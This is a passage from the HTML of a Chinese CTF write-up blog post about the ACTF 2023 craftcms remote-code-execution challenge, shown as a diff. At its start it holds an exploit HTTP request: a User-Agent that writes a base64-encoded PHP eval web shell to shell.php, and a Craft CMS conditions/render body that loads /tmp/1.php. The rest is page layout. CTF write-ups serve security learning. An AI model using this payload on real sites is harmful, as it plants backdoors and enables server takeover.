627b0ba821a077f475abefb99d7bf1eb_identity=a33e3b26b3d436d790b0e2dd746c3b1dcd106a29303032517966f215a0703ccca%3A2%3A%7Bi%3A0%3Bs%3A41%3A%22627b0ba821a077f475abefb99d7bf1eb_identity%22%3Bi%3A1%3Bs%3A159%3A%22%5B1%2C%22%5B%5C%22y26m_oAygOzqwErWffIy_dLFBJB30RzPPTGTsnwwpf0TwEpOqBKvQ3dwsCLihJd7BGo-1XYoPSeUaUL-ZVsSwwFdYOyfhaxydOm0%5C%22%2Cnull%2C%5C%22cac295178e991253f4aae6f6a861ae46%5C%22%5D%22%2C3600%5D%22%3B%7D; __stripe_sid=07e4088e-31e8-4775-b2aa-fe475979b6eb0a2d8e</span><br><span class="line">User-Agent: &lt;?php `echo PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Pz4=|base64 -d&gt;shell.php`;?&gt;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 199</span><br><span class="line"></span><br><span class="line">action=conditions/render&amp;configObject=craft\elements\conditions\ElementCondition&amp;config=&#123;&quot;name&quot;:&quot;configObject&quot;,&quot;as &quot;:&#123;&quot;class&quot;:&quot;\\yii\\rbac\\PhpManager&quot;,&quot;__construct()&quot;:[&#123;&quot;itemFile&quot;:&quot;/tmp/1.php&quot;&#125;]&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "https://rippleqaq.github.io/2023/10/30/ACTF2023-Web/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://rippleqaq.github.io/2023/10/30/ACTF2023-Web/";
+            const title         = "「ACTF-Web复现」";
+            const excerpt       = `ACTF2023-Web复现在学长的输出下，协会web AK了，真是太强了。但是我好菜，没什么作用，痛定思痛，好好复现一下吧。
+WebcraftcmsLet’s RCE!!!
+
+根据题目描述可以知道是实现RCE，靶机启动之后是一个Cr...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    
+                </div>
+                <div class="pull-date">
+                    <time datetime="2023-10-29T16:48:37.428Z" itemprop="dateModified">最后编辑：2023-10-30</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" NewStar2023 Week3 web writeup by ripple" href="/2023/10/19/NewStar2023-Week3-Web/">&lt; 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/static/1.jpg" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                18
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                5
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                0
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix toc-div-class" >
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar" role="progressbar" aria-label="阅读进度："></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2023-Web%E5%A4%8D%E7%8E%B0"><span class="toc-text">ACTF2023-Web复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#craftcms"><span class="toc-text">craftcms</span></a></li></ol></li></ol></li></ol>
+    </div>
+</aside>
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">8</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/match/">match</a><span class="category-list-count">8</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/blog/">blog</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/flask/">flask</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">2</span></li></ul>
+  </aside>
+
+
+            
+                
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2023/10/30/ACTF2023-Web/"><i class="fa  fa-book"></i> ACTF-Web复现</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/10/19/NewStar2023-Week3-Web/"><i class="fa  fa-book"></i> NewStar2023 Week3 web writeup by ripple</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/09/21/blog_demain_deploy/"><i class="fa  fa-book"></i> 为博客设置个人域名</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/04/04/flask_variable/"><i class="fa  fa-book"></i> flask路由与视图映射与传参规则</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/03/11/HGAME-Final/"><i class="fa  fa-book"></i> HGAME 2022 FINAL writeup by ripple</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        
+                        
+                        
+                        
+                        
+                        <li><a target="_blank" rel="me" href="https:///@rippleQAQ"><i class="fa fa fa-share-alt-square"></i></a></li>
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/rippleQAQ"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2026 ripple 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by rippleQAQ.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="3204190542"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
